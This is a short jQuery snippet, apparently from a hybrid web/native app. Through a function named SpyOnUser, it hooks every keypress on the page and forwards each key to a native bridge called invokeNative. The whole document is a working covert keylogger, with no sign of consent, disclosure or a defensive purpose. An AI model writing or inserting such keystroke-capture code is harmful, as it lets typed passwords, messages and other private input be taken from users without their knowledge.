$(document).ready(function () {

    SpyOnUser();

    function SpyOnUser() {

        document.onkeypress = function (e) {
            e = e || window.event;

            invokeNative(e.key);
        }
    }
});